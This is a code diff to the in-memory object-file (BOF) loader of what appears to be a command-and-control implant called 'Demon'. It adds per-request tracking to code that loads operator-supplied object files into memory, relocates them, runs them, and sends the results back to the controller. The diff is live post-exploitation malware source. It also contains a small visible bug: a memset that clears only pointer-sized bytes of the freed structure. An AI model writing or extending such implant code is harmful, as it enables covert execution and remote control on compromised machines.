@@ -540,11 +540,41 @@ SIZE_T CoffeeGetFunMapSize( PCOFFEE Coffee )
     return sizeof( UINT64 ) * NumberOfFuncs;
 }
 
-VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize )
+VOID RemoveCoffeeFromInstance( PCOFFEE Coffee )
 {
-    COFFEE Coffee   = { 0 };
-    PVOID  NextBase = NULL;
-    BOOL   Success  = FALSE;
+    PCOFFEE Entry = Instance.Coffees;
+    PCOFFEE Last  = Entry;
+
+    if ( ! Coffee )
+        return;
+
+    if ( Entry && Entry->RequestID == Coffee->RequestID )
+    {
+        Instance.Coffees = Entry->Next;
+        return;
+    }
+
+    Entry = Entry->Next;
+    while ( Entry )
+    {
+        if ( Entry->RequestID == Coffee->RequestID )
+        {
+            Last->Next = Entry->Next;
+            return;
+        }
+
+        Last  = Entry;
+        Entry = Entry->Next;
+    }
+
+    PUTS( "Coffe entry was not found" )
+}
+
+VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
+{
+    PCOFFEE Coffee   = NULL;
+    PVOID   NextBase = NULL;
+    BOOL    Success  = FALSE;
 
     PRINTF( "[EntryName: %s] [CoffeeData: %p] [ArgData: %p] [ArgSize: %ld]\n", EntryName, CoffeeData, ArgData, ArgSize )
 
@@ -561,85 +591,98 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
      * reloc 32-bit offsets to overflow
      */
 
-    Coffee.Data   = CoffeeData;
-    Coffee.Header = Coffee.Data;
-    Coffee.Symbol = C_PTR( U_PTR( Coffee.Data ) + Coffee.Header->PointerToSymbolTable );
+    Coffee            = Instance.Win32.LocalAlloc( LPTR, sizeof( COFFEE ) );
+    Coffee->Data      = CoffeeData;
+    Coffee->Header    = Coffee->Data;
+    Coffee->Symbol    = C_PTR( U_PTR( Coffee->Data ) + Coffee->Header->PointerToSymbolTable );
+    Coffee->RequestID = RequestID;
+    Coffee->Next      = Instance.Coffees;
+    Instance.Coffees  = Coffee;
 
-    if ( Coffee.Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
+    if ( Coffee->Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
     {
         PUTS( "The BOF is not AMD64" );
         goto END;
     }
 
-    Coffee.SecMap     = Instance.Win32.LocalAlloc( LPTR, Coffee.Header->NumberOfSections * sizeof( SECTION_MAP ) );
-    Coffee.FunMapSize = CoffeeGetFunMapSize( &Coffee );
+    Coffee->SecMap     = Instance.Win32.LocalAlloc( LPTR, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
+    Coffee->FunMapSize = CoffeeGetFunMapSize( Coffee );
 
-    if ( ! Coffee.SecMap )
+    if ( ! Coffee->SecMap )
     {
         PUTS( "Failed to allocate memory" )
         goto END;
     }
 
     // calculate the size of the entire BOF
-    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee.Header->NumberOfSections; SecCnt++ )
+    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee->Header->NumberOfSections; SecCnt++ )
     {
-        Coffee.Section  = C_PTR( U_PTR( Coffee.Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
-        Coffee.BofSize += Coffee.Section->SizeOfRawData;
-        Coffee.BofSize  = ( SIZE_T ) ( ULONG_PTR ) PAGE_ALLIGN( Coffee.BofSize );
+        Coffee->Section  = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
+        Coffee->BofSize += Coffee->Section->SizeOfRawData;
+        Coffee->BofSize  = ( SIZE_T ) ( ULONG_PTR ) PAGE_ALLIGN( Coffee->BofSize );
     }
 
     // at the bottom of the BOF, store the Function map, to ensure all reloc offsets are below 4K
-    Coffee.BofSize += Coffee.FunMapSize;
+    Coffee->BofSize += Coffee->FunMapSize;
 
-    Coffee.ImageBase = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Coffee.BofSize, PAGE_READWRITE );
-    if ( ! Coffee.ImageBase )
+    Coffee->ImageBase = MemoryAlloc( DX_MEM_DEFAULT, NtCurrentProcess(), Coffee->BofSize, PAGE_READWRITE );
+    if ( ! Coffee->ImageBase )
     {
         PUTS( "Failed to allocate memory for the BOF" )
         goto END;
     }
 
-    NextBase = Coffee.ImageBase;
-    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee.Header->NumberOfSections; SecCnt++ )
+    NextBase = Coffee->ImageBase;
+    for ( UINT16 SecCnt = 0 ; SecCnt < Coffee->Header->NumberOfSections; SecCnt++ )
     {
-        Coffee.Section               = C_PTR( U_PTR( Coffee.Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
-        Coffee.SecMap[ SecCnt ].Size = Coffee.Section->SizeOfRawData;
-        Coffee.SecMap[ SecCnt ].Ptr  = NextBase;
+        Coffee->Section               = C_PTR( U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SecCnt ) );
+        Coffee->SecMap[ SecCnt ].Size = Coffee->Section->SizeOfRawData;
+        Coffee->SecMap[ SecCnt ].Ptr  = NextBase;
 
-        NextBase += Coffee.Section->SizeOfRawData;
+        NextBase += Coffee->Section->SizeOfRawData;
         NextBase  = PAGE_ALLIGN( NextBase );
 
-        PRINTF( "Coffee.SecMap[ %d ].Ptr => %p\n", SecCnt, Coffee.SecMap[ SecCnt ].Ptr )
+        PRINTF( "Coffee->SecMap[ %d ].Ptr => %p\n", SecCnt, Coffee->SecMap[ SecCnt ].Ptr )
 
-        MemCopy( Coffee.SecMap[ SecCnt ].Ptr, C_PTR( U_PTR( CoffeeData ) + Coffee.Section->PointerToRawData ), Coffee.Section->SizeOfRawData );
+        MemCopy( Coffee->SecMap[ SecCnt ].Ptr, C_PTR( U_PTR( CoffeeData ) + Coffee->Section->PointerToRawData ), Coffee->Section->SizeOfRawData );
     }
 
     // the FunMap is stored directly after the BOF
-    Coffee.FunMap = NextBase;
+    Coffee->FunMap = NextBase;
 
-    if ( ! CoffeeProcessSections( &Coffee ) )
+    if ( ! CoffeeProcessSections( Coffee ) )
     {
         PUTS( "[*] Failed to process relocation" );
         goto END;
     }
 
     PUTS( "[*] Execute coffee main\n" );
-    Success = CoffeeExecuteFunction( &Coffee, EntryName, ArgData, ArgSize );
+    Success = CoffeeExecuteFunction( Coffee, EntryName, ArgData, ArgSize );
 
 END:
     PUTS( "[*] Cleanup memory" );
-    CoffeeCleanup( &Coffee );
+    CoffeeCleanup( Coffee );
 
     if ( Success )
     {
-        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
+        PPACKAGE Package = PackageCreateWithRequestID( RequestID, DEMON_COMMAND_INLINE_EXECUTE );
         PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_RAN_OK );
         PackageTransmit( Package, NULL, NULL );
     }
     else
     {
-        PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
+        PPACKAGE Package = PackageCreateWithRequestID( RequestID, DEMON_COMMAND_INLINE_EXECUTE );
         PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_COULD_NO_RUN );
         PackageTransmit( Package, NULL, NULL );
+    }
+
+    RemoveCoffeeFromInstance( Coffee );
+
+    if ( Coffee )
+    {
+        MemSet( Coffee, 0, sizeof( Coffee ) );
+        Instance.Win32.LocalFree( Coffee );
+        Coffee = NULL;
     }
 }
 
@@ -648,7 +691,7 @@ VOID CoffeeRunnerThread( PCOFFEE_PARAMS Param )
     if ( ! Param->EntryName || ! Param->CoffeeData )
         goto ExitThread;
 
-    CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize );
+    CoffeeLdr( Param->EntryName, Param->CoffeeData, Param->ArgData, Param->ArgSize, Param->RequestID );
 
 ExitThread:
     if ( Param->EntryName )
@@ -685,7 +728,7 @@ ExitThread:
     Instance.Win32.RtlExitUserThread( 0 );
 }
 
-VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize )
+VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_T CoffeeDataSize, PVOID ArgData, SIZE_T ArgSize, UINT32 RequestID )
 {
     PCOFFEE_PARAMS CoffeeParams = NULL;
     INJECTION_CTX  InjectionCtx = { 0 };
@@ -698,6 +741,7 @@ VOID CoffeeRunner( PCHAR EntryName, DWORD EntryNameSize, PVOID CoffeeData, SIZE_
     CoffeeParams->EntryNameSize  = EntryNameSize;
     CoffeeParams->CoffeeDataSize = CoffeeDataSize;
     CoffeeParams->ArgSize        = ArgSize;
+    CoffeeParams->RequestID      = RequestID;
 
     MemCopy( CoffeeParams->EntryName,  EntryName,  EntryNameSize  );
     MemCopy( CoffeeParams->CoffeeData, CoffeeData, CoffeeDataSize );
